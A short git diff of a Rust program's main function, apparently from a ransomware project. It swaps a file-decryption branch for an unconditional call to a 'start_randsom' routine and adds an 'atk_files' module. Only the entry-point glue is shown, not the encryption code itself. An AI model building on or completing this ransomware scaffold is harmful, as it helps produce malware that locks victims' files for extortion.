@@ -1,5 +1,6 @@
-mod free_files;
-mod logic;
+// mod free_files;
+mod atk_files;
+mod utils;
 use clap::Parser;
 
 #[derive(Parser, Debug)]
@@ -14,11 +15,7 @@ struct Args {
 
 fn main() {
     let args = Args::parse();
-    if let Some(key) = args.key {
-        free_files::decrypt_files(&key);
-    } else {
-        if let Err(e) = logic::start_randsom() {
-            println!("{e}");
-        }
+    if let Err(e) = utils::start_randsom(&args) {
+        println!("{e}");
     }
 }
